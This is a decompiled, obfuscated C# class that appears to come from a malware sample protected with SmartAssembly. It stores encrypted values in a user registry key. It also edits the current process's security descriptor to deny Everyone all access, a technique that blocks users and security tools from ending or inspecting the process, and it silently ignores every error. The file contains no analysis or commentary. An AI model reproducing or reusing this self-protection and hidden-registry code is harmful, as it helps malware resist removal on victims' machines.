using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace drXPuaQNZPOSPCS;

internal sealed class ErCfTxpDFmkPi
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr eFhZRRAFcToF, int zpjxyDgXxoWF, [Out] byte[] YgQEUlqXbT, uint uAFTPmRjsHBUj, out uint ftpIflyeiPRt);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr kqjMxlUlRmWk, int YHWvISCPWyXqr, [In] byte[] boQjHgJOtOhtb);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void AjaSAcVmcrB(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107402824)));
			registryKey.SetValue(OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107402719)), getString_0(107404903));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor gkPvkoJlMIjycPl(IntPtr intptr_0)
	{
		byte[] ygQEUlqXbT = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, ygQEUlqXbT, 0u, out var ftpIflyeiPRt);
		if ((long)ftpIflyeiPRt > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, ygQEUlqXbT = new byte[ftpIflyeiPRt], ftpIflyeiPRt, out ftpIflyeiPRt))
		{
			return null;
		}
		return new RawSecurityDescriptor(ygQEUlqXbT, 0);
	}

	private void uvICjChFKIDyTt(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void gqOFdaPzQkdPtg()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = gkPvkoJlMIjycPl(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			uvICjChFKIDyTt(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static ErCfTxpDFmkPi()
	{
		Strings.CreateGetStringDelegate(typeof(ErCfTxpDFmkPi));
	}
}
